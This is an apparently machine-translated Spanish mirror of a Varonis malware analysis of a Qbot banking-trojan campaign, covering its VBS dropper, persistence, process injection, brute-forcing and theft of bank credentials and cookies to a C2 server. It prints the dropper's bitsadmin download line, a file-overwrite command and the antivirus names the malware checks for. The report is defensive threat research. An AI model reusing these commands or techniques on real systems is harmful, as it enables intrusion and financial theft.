<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>👠 😈 🌿 Qbot ha vuelto. Varonis introdujo un análisis detallado del troyano bancario Qbot 👿 🚵🏽 🙆🏾</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Grupo de investigación de seguridad Varonis descubierto e investigado 
 ciberataque global utilizando una nueva variedad de malware 
 proporcionando q...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Qbot ha vuelto. Varonis introdujo un análisis detallado del troyano bancario Qbot</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/varonis/blog/450208/">  Grupo de investigación de seguridad Varonis descubierto e investigado <br>  ciberataque global utilizando una nueva variedad de malware <br>  proporcionando qbot.  La campaña se dirige activamente a las corporaciones estadounidenses, pero ha afectado a las redes de todo el mundo, con víctimas en Europa, Asia, Rusia y América del Sur, para robar información financiera confidencial, incluidas las credenciales de las cuentas bancarias. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/eg/hg/lp/eghglp-mgqj0m81re6m6jgxf6qw.jpeg"></div><a name="habracut"></a><br>  Durante el análisis, desensamblamos el código para esta variación de Qbot e identificamos un centro de comando de control de ataques que funciona, lo que nos permitió determinar el alcance de la infección.  Las observaciones directas del servidor C2 revelaron que miles de víctimas en todo el mundo ya están comprometidas y son controladas activamente por ciberdelincuentes.  La información adicional encontrada en el servidor de C&amp;C también reveló rastros de los participantes directos detrás de esta campaña. <br><br>  El ataque fue descubierto originalmente por <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Varonis DatAlert</a> , en uno de nuestros <br>  Clientes norteamericanos.  Varonis DatAlert advirtió sobre cargar software sospechoso, moverse dentro del perímetro de seguridad (movimiento lateral interno) y actividad sospechosa de la red. <br><br>  Nuestro equipo actualmente coopera activamente con las autoridades que investigan este incidente y les ha proporcionado información adicional no pública.  En este artículo, compartiremos información que está autorizada para su divulgación. <br><br><h2>  Nueva versión del malware bancario Qbot </h2><br>  Los operadores de esta campaña maliciosa utilizaron una nueva versión de Qbot, un malware conocido y sofisticado diseñado para robar credenciales bancarias.  Qbot utiliza métodos avanzados de anti-análisis, a menudo evita la detección y utiliza nuevos vectores de infección para adelantarse a las medidas de protección disponibles. <br><br>  El malware es polimórfico y cambia constantemente: <br><br><ul><li>  ella crea archivos y carpetas con nombres aleatorios </li><li>  su cargador de actualizaciones a menudo cambia el servidor C2 </li><li>  el descargador de malware cambia cuando hay una conexión a Internet activa (más sobre esto más adelante) </li></ul><br>  Qbot (o Qakbot) se identificó por primera vez en 2009 y ha evolucionado significativamente desde entonces.  Su objetivo principal es recopilar datos de sesiones de Internet en línea y datos relacionados con sitios web financieros.  Sus capacidades de gusano de red le permiten propagarse a través de la red de la organización e infectar otros sistemas. <br><br><h2>  Descubrimiento </h2><br>  Nuestro equipo comenzó una investigación después de la llamada de un cliente, donde el DatAlert ya implementado advirtió sobre actividades sospechosas en sus sistemas.  La investigación reveló que, <br>  Al menos una computadora está infectada con malware y se han identificado intentos de propagarse a otros servidores de red. <br><br>  Se extrajo una muestra del gusano y se envió para su análisis al equipo de investigación de Varonis.  El patrón no coincidía con ningún hash existente, y más investigaciones revelaron que era una nueva cepa. <br><br><h2>  <b>Etapa uno: cuentagotas</b> </h2><br>  Nombre de archivo: REQ_02132019b.doc.vbs <br><br><img src="https://habrastorage.org/webt/7_/sv/m_/7_svm_nsw3lze8vffh6loq87bvk.png"><br><br>  En versiones anteriores de Qbot, se ejecutó una macro en la computadora de la víctima dentro de un documento de Word.  Durante nuestra investigación, también se detectó un archivo zip con la extensión .doc.vbs, lo que indica que la infección inicial probablemente se implementó a través de <br>  correo electrónico de phishing, desde el cual se lanzó el script malicioso VBS (Visual Basic Script). <br><br>  Después de la ejecución, VBS identifica la versión del sistema operativo de la máquina víctima e intenta detectar el software antivirus instalado.  El malware busca las siguientes líneas: Defender, Virus, Antivirus, Malw, Trend, Kaspersky, Kav, McAfee, Symantec. <br><br>  En la nueva versión, el malware usa <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">BITSAdmin</a> para descargar el gestor de arranque.  Este es un comportamiento nuevo, ya que PowerShell se usó en versiones anteriores del malware. <br><br>  BITSAdmin descarga el gestor de arranque desde uno de los siguientes sitios: <br><br><img src="https://habrastorage.org/webt/6e/ch/oe/6echoe9sgeheylwtvxsc5igaub0.png"><br><br>  Y aquí está el código VBS para descargar el gestor de arranque usando BITSAdmin: <br><br><pre><code class="plaintext hljs">intReturn = wShell.Run ('bitsadmin / transfer qahdejob' &amp; Second (Now) &amp; '/ Priority HIGH '&amp; el &amp; urlStr ' ' &amp; tempFile, 0, True)</code> </pre> <br><h2>  <b>La segunda etapa: ganar un punto de apoyo y echar raíces en explorer.exe</b> </h2><br>  Nombre de archivo: widgetcontrol.png <br><br><img src="https://habrastorage.org/webt/7_/sv/m_/7_svm_nsw3lze8vffh6loq87bvk.png"><br><br>  El gestor de arranque, que contiene el núcleo del programa malicioso, tiene varias versiones y se actualiza constantemente incluso después de la ejecución.  La versión que recibe la víctima tras la infección depende del parámetro <i>sp</i> , que está codificado en el archivo VBS. <br><br>  La característica maliciosa es que cada versión del gestor de arranque está firmada con diferentes certificados digitales.  Los certificados de confianza generalmente indican que el archivo es confiable, mientras que los archivos ejecutables no firmados son sospechosos. <br><br>  Se sabe que Qbot utiliza certificados digitales válidos falsos o robados para ganar credibilidad y evitar la detección en el sistema operativo. <br><br>  Descargamos todas las versiones disponibles del gestor de arranque (consulte Indicadores de compromiso a continuación) y comparamos los certificados. <br><br>  <b>Certificados utilizados por el malware:</b> <br><br><ul><li>  Saiitech Systems Limited </li><li>  Ecdjb limited </li><li>  Hitish Patel Consulting Ltd </li><li>  Doorga limitado </li><li>  INTENTEK LIMITED </li><li>  Austek Consulting Limited </li><li>  IO Pro Limited </li><li>  Vercoe IT Ltd </li><li>  Edsabame Consultants Ltd </li><li>  SOVA CONSULTANCY LTD </li></ul><br>  <b>Un ejemplo de uno de los certificados:</b> <br><br><img src="https://habrastorage.org/webt/ak/03/wd/ak03wdaoe8y68acfcuymz3ddup8.png"><br><br><h3>  <b>Fijación</b> </h3><br>  En el primer inicio, el gestor de arranque se copia en% Appdata% \ Roaming \ {Random line} y luego crea lo siguiente: <br><ul><li>  <b>Registrarse: se</b> escribe en una clave de registro conocida para ejecutarse cuando un usuario inicia sesión: <br><br>  HKEY_CURRENT_USER \ Software \ Microsoft \ Windows \ CurrentVersion \ Run </li><li>  <b>Programador de tareas:</b> se crea una tarea para lanzar malware cada 5 horas desde la ruta a continuación <br>  % Appdata% \ Roaming \ Microsoft \ {Cadena aleatoria} </li><li>  <b>Inicio:</b> Qbot crea un acceso directo en el directorio de inicio automático del usuario de inicio </li></ul><br><br><h3>  <b>Explorefectedexe infectado</b> </h3><br>  El gestor de arranque inicia el proceso de explorador de 32 bits explorer.exe y luego lo inyecta en él. <br>  Principales cargas útiles. <br><br>  Aquí hay un volcado del proceso explorer.exe con la carga útil ya instalada como un segmento de memoria RWX: <br><br><img src="https://habrastorage.org/webt/1w/w3/eb/1ww3ebpmwpwxesnekir2detqvxo.png"><br><br>  Después de la implementación, el gestor de arranque sobrescribe su ejecutable original con la versión de calc.exe de 32 bits: <br><br>  "C: \ Windows \ System32 \ cmd.exe" / c ping.exe-N 6 127.0.0.1 y escriba "C: \ Windows \ System32 \ calc.exe"&gt; C: \ Users \ {TKTKTK} \ Desktop \ 1 .exe <br><br><h2>  <b>Etapa tres: sigilosamente sigilosamente y robar dinero</b> </h2><br>  Después de ser reparado en el sistema, el módulo de fuerza bruta comienza a clasificar las contraseñas y las cuentas a través de la red.  Si el malware logró comprometer la cuenta del dominio, lee la lista de usuarios del grupo de Usuarios del dominio y comienza a clasificar estas cuentas.  Si la cuenta local se ve comprometida, el malware usa una lista estándar preconfigurada de usuarios locales.  Los intentos de autenticación usan NTLM y la API WNetAddConnection. <br><br>  Extrajimos los nombres de usuario y contraseñas utilizados por el malware al intentar iterar a través de cuentas locales ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">aquí</a> ).  Un programa malicioso oculta estos diccionarios del análisis estático, pero se pueden extraer en tiempo de ejecución. <br><br>  Imagen del explorador X32dbg Explorerr.exe que intenta conectarse a la computadora remota con el usuario Administrador y la contraseña 12345678: <br><br><img src="https://habrastorage.org/webt/co/sn/iu/cosniu9q3xin4fjj5w1blhjuhhw.png"><br><br><h3>  <b>Lleva tu dinero</b> </h3><br>  El objetivo principal de Qbot es el robo de dinero de sus víctimas;  utiliza varios métodos para robar información financiera, contable y de otro tipo y enviarla al servidor del atacante: <br><br><ul><li>  Registrador de teclas: Qbot captura y envía cada pulsación de tecla que ingresa la víctima y las descarga al atacante </li><li>  Credenciales / cookies de sesión: Qbot busca credenciales / cookies almacenadas de los navegadores y las envía a un atacante </li><li>  Interceptación telefónica: la carga útil maliciosa está incrustada en todos los procesos del sistema con un código que intercepta las llamadas API y busca líneas financieras / bancarias, credenciales o cookies de sesión del proceso y las carga al atacante. </li></ul><br>  La siguiente figura muestra que durante la autenticación en el sitio web del banco buisnessline.huntington.com, el programa malicioso envía los datos de las solicitudes POST y las cookies de sesión al servidor C2 content.bigflimz.com: <br><br><img src="https://habrastorage.org/webt/nf/fn/4f/nffn4foeopdjhbdzkfsasez0vwi.png"><br><br><h2>  <b>Dentro de un servidor atacante C2</b> </h2><br>  En uno de los sitios del atacante, pudimos encontrar archivos de registro que contienen las direcciones IP de las víctimas, información sobre el sistema operativo y los nombres de los productos antivirus.  El servidor C2 mostró información sobre ataques pasados, así como versiones adicionales de programas maliciosos (tabla de versiones en la sección Indicadores de compromiso a continuación). <br><br><img src="https://habrastorage.org/webt/tf/rp/wz/tfrpwzx45qycmrywkizrhry5iaa.png"><br><br>  Algunos resultados pueden contener duplicados, pero a continuación se encuentran los 10 principales países, productos antivirus y sistemas operativos encontrados.  También se sabe que las víctimas del ataque fueron grandes organizaciones financieras en Rusia. <br><br>  Todos los datos se cargan en nuestro <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">repositorio de Github</a> . <br><br>  Encontramos 2.726 direcciones IP únicas para las víctimas.  Dado que muchas organizaciones usan la traducción de direcciones de puerto NAT, que enmascara las direcciones IP internas, el número de víctimas, <br>  probablemente habrá mucho más. <br><br><img src="https://habrastorage.org/webt/w1/ry/oe/w1ryoet4hg6ivu6hbh_-dodqaag.png" alt="Víctimas por país" align="left"><br>  <i>Figura: víctimas por país</i> <br><br><img src="https://habrastorage.org/webt/co/7f/cf/co7fcfsxpr7ymrj_uhptwnx32ts.png" alt="Víctimas por sistema operativo" align="left"><br>  <i>Figura: víctimas por sistema operativo</i> <br><br><img src="https://habrastorage.org/webt/sx/yo/km/sxyokme-8i6f7croamzgfaprphm.png" alt="Víctimas por antivirus utilizado" align="left"><br>  <i>Figura: víctimas por antivirus utilizado</i> <br><br><h2>  <b>Indicadores de compromiso</b> </h2><br>  Todos los indicadores de compromiso se pueden encontrar en Github <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">aquí</a> . <br><br>  <b>Versiones del cargador de arranque</b> <br>  Una lista completa se puede encontrar <a href="">aquí</a> . </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/450208/">https://habr.com/ru/post/450208/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../450196/index.html">Conferencia de arquitectos. Como fue</a></li>
<li><a href="../450198/index.html">Evgeny Kanevsky: “El estado no vio el gran futuro de los equipos pequeños”</a></li>
<li><a href="../450200/index.html">"¡Contribuya al ecosistema de Samsung!" - competencia de ideas. Gran Premio - Galaxy S10</a></li>
<li><a href="../450202/index.html">Python en Visual Studio Code. Problema de abril</a></li>
<li><a href="../450206/index.html">Consejos para desarrolladores novatos</a></li>
<li><a href="../450210/index.html">Extiende tus alas: cómo la videovigilancia ayuda a los ornitólogos a salvar aves raras</a></li>
<li><a href="../450214/index.html">Ejecución de inspecciones de IntelliJ IDEA en Jenkins</a></li>
<li><a href="../450216/index.html">Vacaciones o vacaciones?</a></li>
<li><a href="../450222/index.html">5 servicios geniales de marketing digital que no se escuchan en Rusia</a></li>
<li><a href="../450228/index.html">10 mitos sobre la rabia</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>